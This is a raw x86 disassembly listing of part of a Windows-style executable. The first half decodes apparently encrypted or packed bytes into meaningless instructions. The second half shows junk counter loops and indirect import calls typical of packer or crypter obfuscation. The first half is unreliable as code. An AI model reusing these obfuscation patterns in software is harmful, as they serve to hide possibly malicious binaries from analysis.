  404864:	mov    dh,ch
  404866:	int    0xf6
  404868:	scas   eax,DWORD PTR es:[edi]
  404869:	in     eax,0x5d
  40486b:	xchg   edx,eax
  40486c:	hlt    
  40486d:	sub    al,0xc8
  40486f:	sub    al,0x46
  404871:	pusha  
  404872:	push   DWORD PTR [esi]
  404874:	push   0xded38620
  404879:	jbe    0x404811
  40487b:	inc    eax
  40487c:	inc    esp
  40487d:	add    DWORD PTR [edi],edi
  40487f:	in     al,dx
  404880:	sti    
  404881:	std    
  404882:	adc    ebx,edi
  404884:	test   DWORD PTR [ecx+0x6c],edi
  404887:	syscall 
  404889:	dec    BYTE PTR [edx-0x72b679f8]
  40488f:	sub    ch,BYTE PTR [ecx]
  404891:	out    dx,al
  404892:	push   esi
  404893:	inc    edx
  404894:	adc    eax,DWORD PTR [ebx+0x484d948b]
  40489a:	cs scas eax,DWORD PTR es:[edi]
  40489c:	ret    
  40489d:	test   DWORD PTR [eax],eax
  40489f:	jns    0x404837
  4048a1:	jo     0x404825
  4048a3:	repz scas eax,DWORD PTR es:[edi]
  4048a5:	retf   
  4048a6:	xor    eax,0xbe24ee8f
  4048ab:	repz bound edi,QWORD PTR es:[esi+0x1c]
  4048b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b1:	sub    DWORD PTR [eax+ebp*8-0x64a0ac1e],edi
  4048b8:	std    
  4048b9:	mov    edx,0xfced39be
  4048be:	gs dec ecx
  4048c0:	sub    BYTE PTR [esi+0x575410e8],ah
  4048c6:	inc    ecx
  4048c7:	sbb    al,0x9a
  4048c9:	out    0xd,eax
  4048cb:	sti    
  4048cc:	test   al,0x51
  4048ce:	ret    0xda3b
  4048d1:	sub    al,0xc3
  4048d3:	mov    DWORD PTR [edi+0x35],0x44357dcf
  4048da:	pushf  
  4048db:	inc    ecx
  4048dc:	call   0xd4ad:0x7f0fad72
  4048e3:	mov    BYTE PTR [eax+0x2e],ah
  4048e6:	(bad)  
  4048e7:	or     bh,BYTE PTR [esi-0x68]
  4048ea:	jnp    0x404967
  4048ec:	cmp    al,bh
  4048ee:	add    DWORD PTR [edx],0xffffffee
  4048f1:	xor    DWORD PTR [ebx+edx*2-0x4b11048c],ebp
  4048f8:	out    dx,eax
  4048f9:	fiadd  DWORD PTR [eax+0x52cbb9eb]
  4048ff:	lock mov al,0xa0
  404902:	cmp    bl,BYTE PTR [esi+0x78]
  404905:	xor    al,0x67
  404907:	(bad)  
  404908:	call   0xe295:0x8d21f094
  40490f:	mov    ah,0xb5
  404911:	fistp  WORD PTR [edi]
  404913:	out    dx,al
  404914:	call   FWORD PTR ds:0x3f198e2f
  40491a:	sub    BYTE PTR [ebx+eiz*1],ah
  40491d:	dec    eax
  40491e:	(bad)  
  40491f:	mov    al,0xb7
  404921:	adc    BYTE PTR [esi-0x1c],dh
  404924:	pop    ds
  404925:	push   0xfffffff0
  404927:	sub    cl,BYTE PTR [edx+ebp*1+0x73]
  40492b:	cmp    al,0x69
  40492d:	push   edx
  40492e:	inc    ecx
  40492f:	and    eax,0x1b86682c
  404934:	and    BYTE PTR [edx+0x5a44db35],0xce
  40493b:	out    dx,eax
  40493c:	add    al,0x45
  40493e:	pop    ebx
  40493f:	cmp    BYTE PTR [ebp+0x2e],ah
  404942:	mov    esi,0xf5bbfbe5
  404947:	add    BYTE PTR [ebx-0x673c0899],dl
  40494d:	lock push edi
  40494f:	stc    
  404950:	pop    esp
  404951:	icebp  
  404952:	sub    al,0x75
  404954:	(bad)  [edx]
  404956:	imul   ebp,DWORD PTR ds:0xfbb923f9,0x0
  40495d:	adc    ch,BYTE PTR [ebx+ecx*1-0x40]
  404961:	(bad)  
  404962:	in     eax,dx
  404963:	mov    eax,ds:0xb8940daf
  404968:	mov    ebp,0x85e89033
  40496d:	xor    ecx,ebp
  40496f:	push   cs
  404970:	mov    DWORD PTR [edx+0xd568791],ebx
  404976:	push   ds
  404977:	or     eax,0x6e7031ec
  40497c:	daa    
  40497d:	add    al,0xe5
  40497f:	rcl    DWORD PTR [esi+0x7c],cl
  404982:	mov    ch,bl
  404984:	xor    eax,0x9ce68657
  404989:	lds    ebx,FWORD PTR [edx-0x53908e02]
  40498f:	mov    dh,0xcc
  404991:	daa    
  404992:	jle    0x404956
  404994:	iret   
  404995:	cmp    al,0xaa
  404997:	ins    DWORD PTR es:[edi],dx
  404998:	pop    esp
  404999:	inc    ebp
  40499a:	cmp    DWORD PTR ds:0xa864b2f5,ecx
  4049a0:	icebp  
  4049a1:	ret    0xb434
  4049a4:	adc    eax,DWORD PTR [edi+0x6e36e105]
  4049aa:	or     ebx,ecx
  4049ac:	push   ds
  4049ad:	jge    0x404969
  4049af:	pop    ecx
  4049b0:	mul    DWORD PTR [esi-0x7]
  4049b3:	nop
  4049b4:	lods   eax,DWORD PTR ds:[esi]
  4049b5:	sti    
  4049b6:	jne    0x4049d1
  4049b8:	or     BYTE PTR [edx],0x30
  4049bb:	dec    esi
  4049bc:	mov    ecx,0xbaa0503b
  4049c1:	ins    DWORD PTR es:[edi],dx
  4049c2:	cmp    DWORD PTR [eax+0x66fc97f4],eax
  4049c8:	xlat   BYTE PTR ds:[ebx]
  4049c9:	jnp    0x4049c8
  4049cb:	mov    ebx,0x8be7b346
  4049d0:	adc    BYTE PTR [esi+edi*4+0x20],dh
  4049d4:	(bad)  
  4049d5:	outs   dx,BYTE PTR ds:[esi]
  4049d6:	mov    eax,DWORD PTR [eax+edx*2+0x4423cb01]
  4049dd:	aaa    
  4049de:	xor    al,0xa6
  4049e0:	mov    eax,ds:0x554cebbf
  4049e5:	popf   
  4049e6:	xacquire xchg DWORD PTR [esi+0x180debdb],esi
  4049ed:	sbb    bh,BYTE PTR [esp+ebx*2]
  4049f0:	sets   al
  4049f3:	fld    DWORD PTR [esi]
  4049f5:	sar    bl,cl
  4049f7:	(bad)  
  4049f8:	fst    DWORD PTR [eax]
  4049fa:	lods   eax,DWORD PTR ds:[esi]
  4049fb:	mov    fs,WORD PTR [esi-0x72]
  4049fe:	xor    al,0xc9
  404a00:	aad    0xb2
  404a02:	add    BYTE PTR [esi-0x11cfa30b],ah
  404a08:	enter  0x640b,0x7b
  404a0c:	xchg   edi,eax
  404a0d:	jae    0x404a37
  404a0f:	inc    edi
  404a10:	adc    BYTE PTR [ecx+0x10],dl
  404a13:	or     edi,edx
  404a15:	data16 mov BYTE PTR [ecx-0x7a],ah
  404a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1a:	cmp    bl,bh
  404a1c:	call   0xa5f294bc
  404a21:	xchg   ecx,eax
  404a22:	inc    ebp
  404a23:	fisub  WORD PTR [ebx+eiz*2+0x5ae908fe]
  404a2a:	sbb    al,0x4c
  404a2c:	clc    
  404a2d:	ret    0xedca
  404a30:	loop   0x404a4b
  404a32:	je     0x404a64
  404a34:	fs out 0x24,eax
  404a37:	ret    
  404a38:	shl    DWORD PTR [eax+edi*4-0xd504520],1
  404a3f:	out    dx,al
  404a40:	or     BYTE PTR [eax+0x44],bh
  404a43:	in     eax,0x2a
  404a45:	inc    ecx
  404a46:	iret   
  404a47:	fidivr WORD PTR [edx]
  404a49:	sbb    BYTE PTR [esi-0x25],dl
  404a4c:	lea    esi,[eax+0x2d]
  404a4f:	ficom  WORD PTR [edx-0x6f5ec00a]
  404a55:	les    edi,FWORD PTR [edi]
  404a57:	hlt    
  404a58:	jl     0x404a6c
  404a5a:	(bad)  
  404a5b:	or     BYTE PTR [eax-0x5e],bl
  404a5e:	cmp    DWORD PTR [edx-0x10],0x8451fe8c
  404a65:	ds jl  0x404aa8
  404a68:	data16 cs daa 
  404a6b:	pusha  
  404a6c:	xor    BYTE PTR [edi+0x17],cl
  404a6f:	ins    BYTE PTR es:[edi],dx
  404a70:	push   ds
  404a71:	or     eax,0x1e75bae3
  404a76:	xor    DWORD PTR [esi-0x6e14e7f2],edx
  404a7c:	stc    
  404a7d:	outs   dx,BYTE PTR ds:[esi]
  404a7e:	test   al,0xfe
  404a80:	xchg   ebp,eax
  404a81:	inc    ebp
  404a82:	out    dx,eax
  404a83:	retf   0xd0c2
  404a86:	xchg   edx,eax
  404a87:	or     bl,cl
  404a89:	adc    cl,BYTE PTR [edi]
  404a8b:	sub    ecx,edi
  404a8d:	adc    DWORD PTR [edx-0x4b6b8c8b],ecx
  404a93:	xor    BYTE PTR [edi-0x60f01c3c],0x68
  404a9a:	and    ebp,DWORD PTR [ebx+eiz*8-0x655be45]
  404aa1:	and    al,0x71
  404aa3:	mov    esi,0x734b430d
  404aa8:	sub    al,0xac
  404aaa:	dec    edi
  404aab:	add    al,0x25
  404aad:	and    eax,0xc4ad7660
  404ab2:	nop
  404ab3:	sbb    DWORD PTR [eax+0x4e],eax
  404ab6:	jno    0x404a8f
  404ab8:	cmc    
  404ab9:	adc    BYTE PTR [esi-0x5fdd3f15],cl
  404abf:	sbb    al,0x68
  404ac1:	jmp    0x404acf
  404ac3:	xchg   esi,eax
  404ac4:	xchg   esi,eax
  404ac5:	ins    BYTE PTR es:[edi],dx
  404ac6:	ds jne 0x404a76
  404ac9:	sbb    edx,DWORD PTR ds:0xb4ac
  404ace:	lods   al,BYTE PTR ds:[esi]
  404acf:	out    dx,al
  404ad0:	leave  
  404ad1:	sbb    ch,0xbc
  404ad4:	aas    
  404ad5:	jmp    0x404a5d
  404ad7:	lods   eax,DWORD PTR ds:[esi]
  404ad8:	nop
  404ad9:	test   al,0x0
  404adb:	jmp    0x1c3663e2
  404ae0:	jnp    0x404a79
  404ae2:	jne    0x404b07
  404ae4:	jb     0x404b1f
  404ae6:	retf   
  404ae7:	xchg   ecx,eax
  404ae8:	dec    ebp
  404ae9:	loope  0x404b24
  404aeb:	and    eax,0xfa16904d
  404af0:	(bad)
  404af3:	sbb    al,0x40
  404af5:	cmp    eax,0xb5fda0b1
  404afa:	jmp    0x404b7b
  404afc:	xchg   ebp,eax
  404afd:	sti    
  404afe:	aam    0xd2
  404b00:	out    dx,eax
  404b01:	cdq    
  404b02:	inc    ebp
  404b03:	out    dx,al
  404b04:	push   es
  404b05:	add    DWORD PTR [esp+ecx*4+0x193e450c],0x22dc4707
  404b10:	sbb    eax,0x66a78905
  404b15:	pop    ds
  404b16:	iret   
  404b17:	and    BYTE PTR [ebx-0x217009f9],bl
  404b1d:	mov    edi,DWORD PTR [ebx+0x7d3b8497]
  404b23:	mov    eax,0x53602eda
  404b28:	and    al,0x45
  404b2a:	xchg   ebp,eax
  404b2b:	dec    ebp
  404b2c:	ret    0x1fa6
  404b2f:	or     al,BYTE PTR [ebp+0x20f05373]
  404b35:	or     ebp,DWORD PTR cs:[edi+0x61]
  404b39:	fld    QWORD PTR [ecx+0xd]
  404b3c:	gs pop ss
  404b3e:	int3   
  404b3f:	ins    DWORD PTR es:[edi],dx
  404b40:	push   ebx
  404b41:	xchg   edi,eax
  404b42:	inc    ecx
  404b43:	pop    edx
  404b44:	add    ah,dh
  404b46:	aad    0x62
  404b48:	(bad)  
  404b49:	dec    edi
  404b4a:	inc    esp
  404b4b:	xchg   edi,eax
  404b4c:	xor    eax,0xd708b2a
  404b51:	out    0xd1,eax
  404b53:	mov    edx,0xc5b998ce
  404b58:	mov    bl,0x47
  404b5a:	add    eax,0xba73c4c6
  404b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b60:	rcl    al,1
  404b62:	test   al,0x89
  404b64:	xor    dl,BYTE PTR [esi-0x6e]
  404b67:	lds    ebp,FWORD PTR [ebx]
  404b69:	int    0xb9
  404b6b:	jl     0x404b9a
  404b6d:	cwde   
  404b6e:	idiv   bl
  404b70:	cmp    eax,0x91681648
  404b75:	mov    al,0x1c
  404b77:	mov    ds:0x9bb8f6f0,eax
  404b7c:	cmp    DWORD PTR [edi],ecx
  404b7e:	addr16 call 0x1768a210
  404b84:	dec    esp
  404b85:	iret   
  404b86:	ror    DWORD PTR [edx+0x25ef3ffc],1
  404b8c:	inc    edx
  404b8d:	addr16 clc 
  404b8f:	cwde   
  404b90:	hlt    
  404b91:	push   ecx
  404b92:	sub    al,0xa2
  404b94:	mov    BYTE PTR [ebx-0x3e],ah
  404b97:	mov    dh,0x14
  404b99:	jne    0x404bc7
  404b9b:	repz test eax,0x5d6b5f1c
  404ba1:	aas    
  404ba2:	adc    eax,0xa7f0e7e9
  404ba7:	dec    esp
  404ba8:	arpl   bx,cx
  404baa:	sub    eax,0x9ca10a2e
  404baf:	or     esi,0x457c523c
  404bb5:	adc    eax,0x5ac5a386
  404bba:	jle    0x404bdf
  404bbc:	adc    esp,DWORD PTR [ebx-0x629e7f7f]
  404bc2:	nop
  404bc3:	inc    esi
  404bc4:	sub    DWORD PTR ds:0x5acb0faf,eax
  404bca:	push   ds
  404bcb:	adc    eax,0x3b4fefe1
  404bd0:	retf   0x3759
  404bd3:	mov    eax,ds:0x2b985978
  404bd8:	ss mov ch,0x8e
  404bdb:	add    ch,BYTE PTR [eax]
  404bdd:	push   esp
  404bde:	std    
  404bdf:	mov    bl,0x63
  404be1:	btr    DWORD PTR [ebp+0x6c],ebx
  404be5:	push   es
  404be6:	jnp    0x404c65
  404be8:	cmp    ebp,ecx
  404bea:	adc    eax,eax
  404bec:	mov    esi,0xc81e7007
  404bf1:	test   DWORD PTR [eax],0x6948e99
  404bf7:	(bad)  
  404bf9:	push   0x4f
  404bfb:	ins    DWORD PTR es:[edi],dx
  404bfc:	mov    ebx,0xc157715d
  404c01:	dec    ecx
  404c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c03:	lds    ebx,FWORD PTR [ecx+0x16b29100]
  404c09:	clc    
  404c0a:	cmc    
  404c0b:	or     bl,BYTE PTR ds:0x5b1dc20a
  404c11:	imul   esi,DWORD PTR [edi],0x4c
  404c14:	jmp    ecx
  404c16:	push   ebp
  404c17:	shr    al,0x40
  404c1a:	fisttp QWORD PTR [edx-0x462d30b6]
  404c20:	xor    DWORD PTR [edx+0x72725f9],ebp
  404c26:	enter  0x5099,0xb3
  404c2a:	mov    al,0xaa
  404c2c:	lods   al,BYTE PTR ds:[esi]
  404c2d:	or     eax,0xf380fe7c
  404c32:	mul    DWORD PTR [edx]
  404c34:	push   0x6993cff0
  404c39:	mov    dl,0x17
  404c3b:	push   cs
  404c3c:	and    bh,BYTE PTR [esi-0x51]
  404c3f:	xchg   BYTE PTR [edx+0x20],dl
  404c42:	fwait
  404c43:	push   edx
  404c44:	mov    esi,0xe1ac3acb
  404c49:	sbb    ebp,DWORD PTR [ecx]
  404c4b:	mov    ah,0xef
  404c4d:	pusha  
  404c4e:	test   ah,dl
  404c50:	loopne 0x404be8
  404c52:	es jmp 0x6d9a:0xff730a6
  404c5a:	pop    edx
  404c5b:	test   eax,0x1eb4bab5
  404c60:	lods   al,BYTE PTR ds:[esi]
  404c61:	shl    DWORD PTR [esi-0x220b32c6],0x8b
  404c68:	mov    ds:0x61b5dc45,eax
  404c6d:	stos   BYTE PTR es:[edi],al
  404c6e:	jbe    0x404c58
  404c70:	xor    ecx,DWORD PTR [edi+ecx*8-0x1a]
  404c74:	test   al,0xbc
  404c76:	or     eax,DWORD PTR ds:0xc33d3ea6
  404c7c:	mov    BYTE PTR [eax],0x6b
  404c7f:	lods   eax,DWORD PTR ds:[esi]
  404c80:	or     BYTE PTR [esi-0x5e8719e8],cl
  404c86:	dec    ebp
  404c87:	mov    ss,WORD PTR [ecx-0x1b8d8647]
  404c8d:	or     ebp,DWORD PTR [edi-0x750ef6f5]
  404c93:	das    
  404c94:	push   ebx
  404c95:	inc    bh
  404c97:	mov    edi,0x696632ca
  404c9c:	pop    es
  404c9d:	dec    esi
  404c9e:	fnstcw WORD PTR [edx+edx*2+0x3]
  404ca2:	xor    eax,0x3520194a
  404ca7:	pop    edi
  404ca8:	push   es
  404ca9:	dec    ecx
  404caa:	jae    0x404c5f
  404cac:	aad    0xfd
  404cae:	enter  0xe4de,0x64
  404cb2:	int    0x68
  404cb4:	xchg   BYTE PTR [edi-0x14],al
  404cb7:	mov    bh,0x0
  404cb9:	xor    ah,BYTE PTR [esp+eiz*8]
  404cbc:	std    
  404cbd:	push   ecx
  404cbe:	outs   dx,BYTE PTR ds:[esi]
  404cbf:	sub    edi,ecx
  404cc1:	xchg   ebx,eax
  404cc2:	int3   
  404cc3:	or     DWORD PTR [edx+0x5a1caf07],edx
  404cc9:	neg    BYTE PTR [edi+0x35961986]
  404ccf:	mov    al,0x84
  404cd1:	and    ah,BYTE PTR [ebx+0x7f2ae2c1]
  404cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd8:	jno    0x404cb6
  404cda:	dec    ebp
  404cdb:	add    al,0x7e
  404cdd:	leave  
  404cde:	cmp    BYTE PTR [ecx-0x1],cl
  404ce1:	jae    0x404d43
  404ce3:	popa   
  404ce4:	and    ah,ah
  404ce6:	push   ebp
  404ce7:	out    0xfe,eax
  404ce9:	dec    eax
  404cea:	sbb    BYTE PTR es:[esp+ebx*1+0x72f319bf],0xec
  404cf3:	push   edi
  404cf4:	out    0xbf,eax
  404cf6:	sbb    eax,ebx
  404cf8:	bound  edi,QWORD PTR [ebx-0x65]
  404cfb:	push   eax
  404cfc:	jmp    0x404d62
  404cfe:	pop    ebp
  404cff:	call   0xb9dc23db
  404d04:	out    0xfe,eax
  404d06:	inc    esi
  404d07:	dec    edi
  404d08:	jl     0x404d5d
  404d0a:	aaa    
  404d0b:	and    DWORD PTR [ebp-0x2c],edi
  404d0e:	sbb    DWORD PTR [esi],edi
  404d10:	push   0xffffffcc
  404d12:	jbe    0x404d86
  404d14:	ficom  DWORD PTR [esi-0x585993e8]
  404d1a:	cmp    ch,bh
  404d1c:	or     esp,DWORD PTR [esi+0x27fc98f5]
  404d22:	dec    ecx
  404d23:	icebp  
  404d24:	dec    eax
  404d25:	sub    esi,ebx
  404d27:	mov    ah,0x37
  404d29:	xor    bx,ax
  404d2c:	test   eax,0xb8eeccb0
  404d31:	mov    ebp,0x6ee1321d
  404d36:	cmp    eax,0x585aa653
  404d3b:	xor    cl,BYTE PTR [edx]
  404d3d:	test   BYTE PTR [edx-0x7],bh
  404d40:	ds push eax
  404d42:	sub    DWORD PTR [ecx],esi
  404d44:	pop    ebx
  404d45:	or     al,0x84
  404d47:	lahf   
  404d48:	mov    BYTE PTR [eax-0x25],dl
  404d4b:	jno    0x404d02
  404d4d:	(bad)  
  404d4f:	(bad)  
  404d50:	lahf   
  404d51:	inc    esi
  404d52:	xor    cl,BYTE PTR [ecx]
  404d54:	sbb    esi,DWORD PTR [esi+0x1d]
  404d57:	push   ds
  404d58:	mov    ah,0x2b
  404d5a:	ret    0xc511
  404d5d:	jmp    0x404ced
  404d5f:	arpl   WORD PTR [esi+0x65],bx
  404d62:	pop    ebx
  404d63:	mov    ecx,0xedcb98e9
  404d68:	adc    eax,0x1da69349
  404d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d6e:	retf   0xbc02
  404d71:	or     DWORD PTR [ecx],ebx
  404d73:	or     al,0x61
  404d75:	loopne 0x404df3
  404d77:	jecxz  0x404dd2
  404d79:	test   DWORD PTR [eax+0x4518bb6a],edx
  404d7f:	mov    esi,0xb46c7aef
  404d84:	mov    ds:0x24226a5,al
  404d89:	or     esi,DWORD PTR [ebp+0x6231b73c]
  404d8f:	jb     0x404dfe
  404d91:	fsubr  st(1),st
  404d93:	xchg   BYTE PTR [edi-0x7e],al
  404d96:	pop    esi
  404d97:	ret    
  404d98:	retf   
  404d99:	inc    ebx
  404d9a:	jmp    0x91fb:0x113fc34f
  404da1:	dec    edi
  404da2:	test   BYTE PTR [esi-0x13b4394f],dh
  404da8:	cmp    DWORD PTR ds:0xed51ef48,0xffffffc1
  404daf:	lahf   
  404db0:	cmp    al,BYTE PTR [ecx]
  404db2:	mov    WORD PTR [ebx+0x26],?
  404db5:	sbb    DWORD PTR [ebx-0x3ba6c94c],0xa15f738e
  404dbf:	sar    DWORD PTR [ebx+0x15dc5cbf],1
  404dc5:	mov    esp,0xb5e43dd6
  404dca:	push   esp
  404dcb:	cmp    eax,0x6fa4df7b
  404dd0:	(bad)  
  404dd1:	dec    esp
  404dd2:	dec    esp
  404dd3:	out    dx,eax
  404dd4:	in     al,dx
  404dd5:	and    BYTE PTR [ecx+0x72514a7c],ch
  404ddb:	mov    edi,0x8ca30511
  404de0:	pop    ebx
  404de1:	out    dx,al
  404de2:	int3   
  404de3:	cli    
  404de4:	mov    cs,WORD PTR [ebp+0x29]
  404de7:	retf   
  404de8:	xlat   BYTE PTR ds:[ebx]
  404de9:	in     eax,dx
  404dea:	jmp    0x404d7a
  404dec:	imul   esi,edx,0xffffffe9
  404def:	ja     0x404ddd
  404df1:	std    
  404df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df3:	arpl   WORD PTR [edx+0x66],bx
  404df6:	mov    esi,0xd8840fcc
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	add    BYTE PTR [ebx],ah
  404dff:	add    eax,0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
